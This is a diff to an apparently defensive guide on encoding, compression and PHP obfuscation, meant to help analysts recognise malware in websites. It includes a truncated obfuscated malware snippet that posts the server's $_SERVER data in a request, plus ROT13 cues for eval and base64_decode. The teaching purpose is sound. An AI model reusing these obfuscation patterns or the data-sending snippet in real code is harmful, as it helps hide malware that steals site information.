@@ -1,8 +1,5 @@
 # Encoding and Compression
 
-* TOC
-{:toc}
-
 ## Character Encoding
 First, there is character encoding. This is how numbers and letters are represented within the computer. The most common form of character encoding is ASCII, in which characters are stored as a single byte of data. Most of the time, your English webpages are written in ASCII, whether they are HTML, ASP, PHP, or JavaScript. Non-English webpages will also use ASCII characters if they share any characters with English, but the rest of the characters are what is called Unicode, an encoding that stores characters in 1 - 4 bytes of data, depending on where the character is in the list of Unicode characters.
 
@@ -27,6 +24,7 @@ Many programs, web browsers included, really do not like taking input with lots 
 
 Over the years, there have been several different text encoding formats, but the ones that are most familiar are:
 * base64
+* ROT13
 * uuencoding
 * urlencode
 
@@ -43,6 +41,16 @@ Examples:
 The above examples have some similar characteristics _within_ themselves that, over time, will be second nature when looking at other strings. For example, we see `aHR0` showing up several times in each string. Based on experience, I _know_ that `aHR0` converts to `htt` and, more specifically, `aHR0cDov` converts to `http:/`.  As you see more of these as an analyst, you will find more base64 that you look at and simply know what it means.
 
 [Wikipedia](https://en.wikipedia.org/wiki/Base64)
+
+### ROT13 encoding
+ROT13 encoding is a character substitution encoding mechanism where the all the _letters_ are replaced by the letter that is shifted 13 places away. All other characters are left alone by the language-native functions. This is, in essence, a (Caesar cipher)[https://en.wikipedia.org/wiki/Caesar_cipher] with a shift of 13.
+
+This sort of encoding is easily recognizable if you see these strings:
+* `riny` ==> `eval`
+* `onfr64_qrpbqr` ==> `base64_decode`
+* `cert_ercynpr` ==> `preg_replace`
+
+This is rarely used as a primary encoding mechanism because it only changes the letters A-Z and doesn't alter other characters, leaving the structure of the code in place.
 
 ### uuencoding
 Less commonly seen as a primary encoding mechanism, uuencoding (Unix-to-Unix encoding) is occasionally used as an intermediary to confuse people who are going over code manually. Text is encoded using the same methodology as base64 (three 8-bit characters are converted to four 6-bit characters), but the character set is different and file format is rather unique:
@@ -81,3 +89,36 @@ The problem is that, after only a single compression / encoding cycle, the resul
 I have a plain file of URLs and text. It is just a list of games and the URL to them on Steam. It is not even HTML. It comes in at 6300 bytes in size.
 
 After a single compression / encoding cycle, it is under 2700 bytes in length. This seems like a great win, and it is, but it is also the **only** win. Every cycle after the first will make the resulting data larger than the previous. It may seems ridiculous, but after 36 of these cycles, the resulting data is larger than the original. You may say "But, Maarten, who is going to do that? No one is going to compress and encode their data that many times", but I've seen Wordpress theme credit links encoded far more than that (85 cycles is the record that I've personally decoded). Whether those links were from the original authors or from a group that removed the copyright and license checks from premium themes, I don't know, but they do it.
+
+## Obfuscation
+At it's core, obfuscation and encoding perform the same function, hiding the purpose of the code. On the simple end, obfuscation attempts to do this by changing function and variable names to be intentionally confusing. On the complex end, obfuscation can result in text that just appears to be random letters, numbers, and punctuation.
+
+### Plain Obfuscation
+Some of the more common forms of plain obfuscated code that I've seen are `o0_` and `Il1` code, where those three characters are used for all variable and function names in various combinations.
+
+#### Examples
+'il1' obfuscation tends to look similar to the below example, where most of the variables use the number 1, lowercase L, and upper or lower case I characters to deliberately confuse someone looking at the code and make it difficult to eyeball how the variables are being used.
+    <?php if(!@$incode!=false||!@$incode!=null){$vl='s';$serverid='[hash]';$liillilllil=time();function lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill){if(ini_get('allow_url_fopen')==1):$lillillliiili=stream_context_create(array('http'=>array('method'=>'POST','header'=>array('Content-type: application/x-www-form-urlencoded'),'content'=>http_build_query($_SERVER))));if($lilillilllllill=='yes'):...
+
+'o0_' obfuscation is similar, but uses uppercase O, the number 0, and the underscore character (`_`) to achieve the same end goal.
+    <?php
+    //header('Content-Type:text/html; charset=utf-8');
+    $O_OOO0__00='someval';
+    $OO_OO000__='otherval';
+    $O_O0O_0_O0='thirdval';
+    $O_O0O0_O0_='etc';
+    ...
+
+### Complex Obfuscation
+Complex obfuscation utilizes multiple techniques to make analyzing code more difficult. Most of the time, this is simply a combination of encryption and various encoding and compression techniques. Occasionally, I've come across obfuscation that does additional work, whether that's arithmetic, concatenation, or using substrings. As we run into these in the examples, I'll go into more detail on what the particular sample is doing.
+
+Some of the more complex obfuscation tools straddle the border between obfuscation and encryption. Many commercial encoders are fit this category and can't be easily decoded on an individual file basis. _Fortunately_, these commercial products are easy to detect. _Unfortunately_, if you (as a website owner) don't use these products and you see their files in your website, you will have a tough time figuring out what those files are doing by performing plain code analysis.
+
+Some of the more common commercial obfuscators / encoders are:
+* IonCube
+* SourceGuardian
+
+Additional obfuscators / encoders that I've seen commonly used by _malware_ include:
+* FOPO (Free Online Php Obfuscator) and it's many variants
+* AROHA PHP Encoder and it's variants
+* Adilbo's Php Encoder and Obfuscator
